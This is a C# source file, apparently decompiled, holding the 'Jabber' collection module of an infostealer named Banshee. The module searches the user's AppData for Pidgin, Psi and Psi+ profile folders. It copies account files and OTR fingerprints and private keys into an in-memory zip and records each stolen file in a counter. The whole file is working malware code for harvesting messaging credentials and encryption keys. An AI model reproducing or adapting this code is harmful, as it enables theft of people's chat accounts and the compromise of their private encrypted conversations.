﻿using System;
using System.IO;
using System.Threading.Tasks;
using Banshee.Helper.Data;

namespace Banshee.Targets.Messangers
{
	// Token: 0x02000040 RID: 64
	public class Jabber : ITarget
	{
		// Token: 0x06000091 RID: 145 RVA: 0x000050B0 File Offset: 0x000050B0
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string[] source = new string[]
			{
				folderPath + "\\.purple\\",
				folderPath + "\\Psi\\profiles\\default\\",
				folderPath + "\\Psi+\\profiles\\default\\"
			};
			string[] files2 = new string[]
			{
				"accounts.xml",
				"otr.fingerprints",
				"otr.keys",
				"otr.private_key"
			};
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Jabber";
			Parallel.ForEach<string>(source, delegate(string dir)
			{
				if (Directory.Exists(dir))
				{
					Parallel.ForEach<string>(files2, delegate(string file2)
					{
						if (File.Exists(dir + file2))
						{
							string text = "Jabber\\" + file2;
							zip.AddFile(ZipPath.Messengers(text), File.ReadAllBytes(dir + file2));
							counterApplications.Files.Add(dir + file2 + " => " + text);
						}
					});
				}
			});
			if (counterApplications.Files.Count > 0)
			{
				counterApplications.Files.Add("Jabber\\");
				counter.Messangers.Add(counterApplications);
			}
		}
	}
}
